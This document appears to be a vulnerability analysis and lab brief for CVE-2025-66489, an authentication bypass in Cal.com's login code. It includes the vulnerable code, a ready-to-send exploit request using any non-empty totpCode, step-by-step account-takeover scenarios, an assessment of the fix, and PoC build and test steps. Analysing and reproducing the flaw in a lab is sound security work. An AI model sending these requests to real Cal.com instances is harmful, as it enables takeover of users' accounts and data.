# Vulnerability Analysis: CVE-2025-66489

## Root Cause

**Classification:** CWE-303 — Incorrect Implementation of Authentication Algorithm

The credentials provider `authorize()` function in Cal.com's NextAuth configuration contains a logic flaw where **password verification is conditionally gated on the absence of a `totpCode` field in the login request**. The vulnerable conditional at line 179 of `packages/features/auth/lib/next-auth-options.ts` is:

```typescript
if (user.password?.hash && !credentials.totpCode) {
    // Password verification ONLY happens inside this block
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

When an attacker includes **any truthy value** in the `totpCode` field (e.g., `"000000"`, `"x"`, `"anything"`), the condition `!credentials.totpCode` evaluates to `false`, and the **entire password verification block is skipped**. The code then falls through to the 2FA verification section, which only executes when `user.twoFactorEnabled` is `true`. For users without 2FA enabled, **no authentication check occurs at all**, and login succeeds.

### Additional Logic Flaws in the Vulnerable Code

The code at lines 172-177 contains **two additional flawed conditionals** that further compound the issue:

1. **Line 172:** `if (!user.password?.hash && user.identityProvider !== IdentityProvider.CAL && !credentials.totpCode)` — This check also allows bypass via `totpCode` for users with external identity providers who lack a password hash, potentially allowing unauthorized access through the credentials endpoint for OAuth users.

2. **Line 179-180:** There is a **dead code** check: `if (user.password?.hash && !credentials.totpCode) { if (!user.password?.hash) {` — the inner condition can never be true since the outer condition already requires `user.password?.hash` to be truthy.

## Vulnerable File(s) and Function(s)

| File | Function | Lines | Description |
|------|----------|-------|-------------|
| `packages/features/auth/lib/next-auth-options.ts` | `authorize()` (CredentialsProvider) | 147-271 | Main authentication function |
| `packages/features/auth/lib/next-auth-options.ts` | Password check block | 179-187 | Vulnerable conditional that skips password verification |
| `apps/web/pages/api/auth/[...nextauth].ts` | NextAuth handler | 1-10 | HTTP endpoint that exposes the vulnerable authorize function |

### Full Vulnerable Code (lines 172-187)

```typescript
// Line 172: Flawed - allows bypass via totpCode for non-CAL identity providers
if (!user.password?.hash && user.identityProvider !== IdentityProvider.CAL && !credentials.totpCode) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
// Line 175: Correct check for CAL users without password
if (!user.password?.hash && user.identityProvider == IdentityProvider.CAL) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}

// Line 179: CRITICAL VULNERABILITY - password check skipped when totpCode is present
if (user.password?.hash && !credentials.totpCode) {
    if (!user.password?.hash) {  // Dead code - can never be true
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

## Triggering Input

### Minimal Exploit Request

```http
POST /api/auth/callback/credentials HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

email=victim@example.com&password=anything&totpCode=000000&csrfToken=<valid_csrf_token>
```

**Key fields:**
- `email` — Must be a valid registered email address
- `password` — Can be **any string** (including empty string or "wrong") — it is never checked
- `totpCode` — Any **truthy** value. A single character `"x"` is sufficient. The value `"000000"` or `"123456"` works. Even `"a"` works.
- `csrfToken` — Must be a valid CSRF token obtained from `GET /api/auth/csrf`

### What Makes the Input Trigger

The `totpCode` field must be:
- **Present** in the POST body
- **Truthy** in JavaScript terms (non-empty string)

The following values will trigger the bypass:
- `totpCode=000000` ✓
- `totpCode=x` ✓
- `totpCode=anything` ✓

The following will NOT trigger the bypass:
- `totpCode=` (empty string — falsy) ✗
- Absent `totpCode` field ✗

## Attack Scenario

### Scenario 1: Full Authentication Bypass (Non-2FA Users)

This is the primary attack scenario. Most Cal.com users do not enable 2FA.

1. **Reconnaissance**: Attacker identifies a target Cal.com instance and discovers a valid user email (e.g., from public booking pages, calendar links, or enumeration).

2. **Obtain CSRF token**: 
   ```
   GET /api/auth/csrf → {"csrfToken":"<token>"}
   ```

3. **Send bypass request**:
   ```
   POST /api/auth/callback/credentials
   Content-Type: application/x-www-form-urlencoded
   
   email=victim@example.com&password=wrong&totpCode=000000&csrfToken=<token>
   ```

4. **Authentication succeeds**: The response returns a `302 Redirect` with `Set-Cookie: next-auth.session-token=<jwt>`. The attacker now has a valid session as the victim.

5. **Full account takeover**: The attacker can access the victim's calendar, bookings, integrations, API keys, and personal information. They can also modify scheduling settings, impersonate via calendar invites, and access connected third-party services (Google Calendar, Zoom, etc.).

### Scenario 2: Password Factor Bypass (2FA Users)

For users with `twoFactorEnabled: true`:

1. Steps 1-3 same as above.
2. The password check is still skipped.
3. The code reaches the 2FA check block (line 215), which requires a valid TOTP code.
4. The attacker must supply a valid 6-digit TOTP code, which requires access to the user's authenticator secret.
5. **Impact**: This degrades 2-factor authentication (password + TOTP) to single-factor (TOTP only). If the attacker compromises the TOTP secret via another channel, the password is no longer a barrier.

## Impact

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | HIGH | Full access to victim's calendar, bookings, personal data, API keys, connected service tokens |
| **Integrity** | HIGH | Can modify schedules, cancel bookings, change account settings, create/delete event types |
| **Availability** | HIGH | Can lock out victim by changing password/email, disabling account features, or deleting booking types |

**CVSS 3.1:** 9.8 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

- **Attack Vector**: Network (HTTP POST to public API endpoint)
- **Attack Complexity**: Low (single HTTP request after CSRF token retrieval)
- **Privileges Required**: None (unauthenticated)
- **User Interaction**: None

## Authentication Requirements

### Pre-authentication (Vulnerability is PRE-AUTH)

The vulnerability is exploitable **without any authentication**. The attacker does not need:
- A valid password
- A valid TOTP code (for non-2FA users)
- An existing session
- Any API key or token

**Only requirements:**
1. **A valid CSRF token** — obtained via unauthenticated `GET /api/auth/csrf`
2. **A valid user email** — must correspond to an existing user in the database

### For PoC Testing

To test in a lab environment, the PoC agent needs:
1. Create a test user in the PostgreSQL database with:
   - `email`: e.g., `test@example.com`
   - `password.hash`: bcrypt hash of any known password (e.g., hash of `"Password123!"`)
   - `identityProvider`: `CAL`
   - `twoFactorEnabled`: `false`
   - `completedOnboarding`: `true`
2. The application must be running and serving `/api/auth/*` routes
3. No special API keys or tokens needed — just the CSRF token from `/api/auth/csrf`

## Fix Assessment

### Fix Description (Commit `63d1361a7a`)

The fix replaces the flawed 3-block conditional with 2 clean, unconditional checks:

**After (fixed):**
```typescript
// Users without a password must use their identity provider (Google/SAML) to login
if (!user.password?.hash) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}

// Always verify password for users who have one
const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
if (!isCorrectPassword) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
```

### Assessment: Fix is COMPLETE and THOROUGH

The fix correctly addresses the root cause by:

1. **Removing all `credentials.totpCode` conditions** from the password verification path — `totpCode` no longer influences whether password verification occurs.
2. **Making password verification unconditional** — every user with a password hash must pass `verifyPassword()`, regardless of what other fields are in the request.
3. **Simplifying the no-password check** — users without a password hash are rejected unconditionally, regardless of identity provider or totpCode presence.
4. **Eliminating dead code** — the unreachable inner `!user.password?.hash` check is removed.
5. **Preserving 2FA flow** — the subsequent 2FA verification block (lines 189+) remains unchanged and correctly validates TOTP codes and backup codes as an additional factor.

**No bypass vectors identified:**
- The `totpCode` field can no longer influence password verification
- The fix is at the correct architectural level (the authorize function)  
- There are no alternative code paths to reach the same vulnerability
- The 2FA check block runs independently after the password check, so both factors are enforced when applicable
- No encoding tricks, type coercion, or race conditions can bypass the fix

## Related Attack Surface

### ImpersonationProvider (`packages/features/ee/impersonation/lib/ImpersonationProvider.ts`)
- **Not vulnerable to the same pattern.** The ImpersonationProvider uses a completely different authentication model — it requires an existing admin/team-admin session and does not accept password or totpCode credentials. No password bypass is possible here.

### TOTP Setup Endpoint (`apps/web/app/api/auth/two-factor/totp/setup/route.ts`)
- **Not vulnerable.** This endpoint requires an authenticated session and verifies the password unconditionally via `verifyPassword(body.password, user.password.hash)` at line 56. No `totpCode` gating exists.

### TOTP Disable Endpoint (`apps/web/app/api/auth/two-factor/totp/disable/route.ts`)
- **Minor note:** Lines 45-50 show that password verification for disabling 2FA is conditional on `user.password?.hash && user.identityProvider === IdentityProvider.CAL`. This is architecturally different from the login vulnerability and appears to be a correct implementation (OAuth users without passwords skip password check since they authenticated via their provider). No bypass identified.

### Other `verifyPassword` callers
Searched all 11 files that reference `verifyPassword`. All other callers (change password, delete account, set org password) operate behind authenticated sessions and verify password unconditionally. **None identified as vulnerable** to the same bypass pattern.

## Potential Bypass Vectors

**None identified.** The fix is complete. The password verification is now unconditional and cannot be influenced by any user-supplied field other than the password itself.

## Build System

| Field | Value |
|-------|-------|
| **Build System** | Yarn 3.4.1 workspaces + Turbo (monorepo) |
| **Primary Language** | TypeScript (Node.js) |
| **Framework** | Next.js (Pages Router + App Router) |
| **Node.js Version** | 20 |
| **Package Manager** | Yarn 3.4.1 (`packageManager` in `package.json`) |
| **ORM** | Prisma (PostgreSQL) |
| **Auth Library** | NextAuth.js (credentials provider) |

## Build Commands

The project ships with a multi-stage `Dockerfile` at the repository root. The build process is:

```bash
# Install dependencies
yarn config set httpTimeout 1200000
npx turbo prune --scope=@calcom/web --scope=@calcom/trpc --docker
yarn install

# Build
yarn workspace @calcom/trpc run build
yarn --cwd packages/embeds/embed-core workspace @calcom/embed-core run build
yarn --cwd apps/web workspace @calcom/web run build

# Startup (in container)
npx prisma migrate deploy --schema /calcom/packages/prisma/schema.prisma
npx ts-node --transpile-only /calcom/scripts/seed-app-store.ts
yarn start
```

### Simplified Lab Build (Recommended)

For PoC purposes, the lab does **not** need a full production build. The recommended approach:

1. Use the existing `Dockerfile` with `docker compose` (from `docker-compose.yml`)
2. Build at tag `v5.9.7` for the vulnerable version
3. The `docker-compose.yml` provides PostgreSQL and Redis services

**Build arguments required:**
```
NEXT_PUBLIC_WEBAPP_URL=http://localhost:3000
NEXTAUTH_SECRET=secret
CALENDSO_ENCRYPTION_KEY=secret
DATABASE_URL=postgresql://unicorn_user:magical_password@database:5432/calendso
```

## Dependencies

### System Dependencies
- Node.js 20 (base image: `node:20`)
- PostgreSQL (any recent version, included in docker-compose)
- Redis (optional but included in docker-compose)

### Key NPM Dependencies
- `next-auth` — Authentication framework
- `next` — Next.js web framework
- `prisma` / `@prisma/client` — ORM for PostgreSQL
- `bcryptjs` — Password hashing (used by `verifyPassword`)
- `otplib` — TOTP generation/verification
- `@calcom/lib` — Internal crypto and TOTP utilities

### No Additional System Packages Required
The `node:20` Docker image and Yarn dependencies cover everything needed.

## Runtime Requirements

### Services
- **PostgreSQL** — Database backend (connection via `DATABASE_URL`)
- **Redis** — Optional caching layer (connection via `REDIS_URL`)

### Environment Variables (Minimum for PoC)
```env
DATABASE_URL=postgresql://unicorn_user:magical_password@database:5432/calendso
DATABASE_DIRECT_URL=postgresql://unicorn_user:magical_password@database:5432/calendso
NEXTAUTH_SECRET=secret
CALENDSO_ENCRYPTION_KEY=secret
NEXT_PUBLIC_WEBAPP_URL=http://localhost:3000
DATABASE_HOST=database:5432
POSTGRES_USER=unicorn_user
POSTGRES_PASSWORD=magical_password
POSTGRES_DB=calendso
```

### Database Setup
After container start, Prisma migrations run automatically via `scripts/start.sh`:
```bash
npx prisma migrate deploy --schema /calcom/packages/prisma/schema.prisma
```

A test user must be seeded into the database for the PoC to work. This can be done via:
```sql
-- Create a test user with bcrypt hash of "Password123!"
INSERT INTO "User" (email, username, name, "identityProvider", "completedOnboarding", role)
VALUES ('victim@example.com', 'victim', 'Victim User', 'CAL', true, 'USER');

-- Create password hash (bcrypt of "Password123!")
INSERT INTO "UserPassword" ("userId", hash)
VALUES ((SELECT id FROM "User" WHERE email='victim@example.com'), '$2a$10$...');
```

Alternatively, use the Cal.com signup flow at `/signup` to create a test user interactively or via API.

### Network Setup
- Cal.com web app listens on port **3000**
- The vulnerable endpoint is `POST /api/auth/callback/credentials`
- CSRF token endpoint is `GET /api/auth/csrf`
- No TLS/HTTPS required for lab testing (HTTP works)

## PoC Verification Strategy

### Positive Test (Exploit Works — v5.9.7)
1. `GET /api/auth/csrf` → extract `csrfToken`
2. `POST /api/auth/callback/credentials` with `email=victim@example.com&password=WRONG&totpCode=000000&csrfToken=<token>`
3. **Expected**: HTTP 302 redirect, `Set-Cookie: next-auth.session-token=<jwt>` present
4. **Confirm session**: `GET /api/auth/session` with the session cookie → should return user data

### Negative Test (Normal Login Fails with Wrong Password — v5.9.7)
1. `GET /api/auth/csrf` → extract `csrfToken`
2. `POST /api/auth/callback/credentials` with `email=victim@example.com&password=WRONG&csrfToken=<token>` (NO totpCode)
3. **Expected**: HTTP 401 or redirect to login with error, no session cookie

### Regression Test (Exploit Fails — v5.9.8+)
1. Same as Positive Test but against patched version
2. **Expected**: Login fails, no session cookie returned
